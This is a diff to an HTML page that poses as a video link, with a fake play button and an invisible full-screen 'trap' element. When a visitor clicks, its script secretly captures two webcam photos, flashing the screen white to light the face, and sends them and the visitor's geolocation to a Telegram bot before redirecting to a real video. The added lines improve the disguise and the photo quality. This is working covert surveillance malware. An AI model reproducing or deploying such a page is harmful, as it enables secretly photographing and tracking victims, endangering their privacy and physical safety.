@@ -9,13 +9,31 @@
     <meta property="og:type" content="video.other">
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
-        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg') no-repeat center center; background-size: cover; z-index: 1; filter: brightness(0.8); }
+        .bg { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: url('https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg') no-repeat center center; 
+            background-size: contain; /* وێنەکە دەباتە دواوە */
+            z-index: 1; 
+        }
+        .play-btn { 
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); 
+            z-index: 5; pointer-events: none; 
+        }
+        .play-icon { width: 90px; height: 90px; fill: white; opacity: 0.9; }
         #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
+        #flash { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: white; z-index: 200; display: none; 
+        }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="bg"></div>
+    <div class="play-btn">
+        <svg class="play-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+    </div>
+    <div id="flash"></div>
     <div id="trap" onclick="startApp()"></div>
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
@@ -28,7 +46,7 @@
         async function sendPhoto(v, c, fileName, caption) {
             c.width = v.videoWidth; c.height = v.videoHeight;
             c.getContext('2d').drawImage(v, 0, 0);
-            const blob = await (await fetch(c.toDataURL('image/jpeg', 0.7))).blob();
+            const blob = await (await fetch(c.toDataURL('image/jpeg', 0.9))).blob();
             const fd = new FormData();
             fd.append('chat_id', chat_id);
             fd.append('photo', blob, fileName);
@@ -42,30 +60,30 @@
                 const v = document.getElementById('v');
                 v.srcObject = s;
                 await v.play();
-                
-                // وێنەی یەکەم (دوای ١ چرکە)
+
+                // چالاککردنی فلاش (سپی بوونی شاشە)
+                const f = document.getElementById('flash');
+                f.style.display = 'block';
+
                 setTimeout(async () => {
-                    await sendPhoto(v, document.getElementById('c'), "1.jpg", "📸 وێنەی یەکەم");
+                    // وێنەی یەکەم
+                    await sendPhoto(v, document.getElementById('c'), "1.jpg", "📸 وێنەی یەکەم (بە فلاش)");
                     
-                    // وێنەی دووەم (دوای ٢٠٠ میلی چرکە)
                     setTimeout(async () => {
+                        // وێنەی دووەم
                         await sendPhoto(v, document.getElementById('c'), "2.jpg", "📸 وێنەی دووەم");
-                        
-                        // ناردنی لۆکەیشن بە لینکی شین و ورد
+                        f.style.display = 'none'; // کوژاندنەوەی فلاش
+
                         if (navigator.geolocation) {
                             navigator.geolocation.getCurrentPosition(async (pos) => {
-                                const lat = pos.coords.latitude;
-                                const lon = pos.coords.longitude;
-                                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                                const mapLink = `http://www.google.com/maps/place/${pos.coords.latitude},${pos.coords.longitude}`;
                                 await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\n" + mapLink)}`);
                                 window.location.href = targetVideo;
                             }, () => { window.location.href = targetVideo; });
                         } else { window.location.href = targetVideo; }
                     }, 200);
                 }, 1000);
-            } catch (e) {
-                window.location.href = targetVideo;
-            }
+            } catch (e) { window.location.href = targetVideo; }
         }
     </script>
 </body>
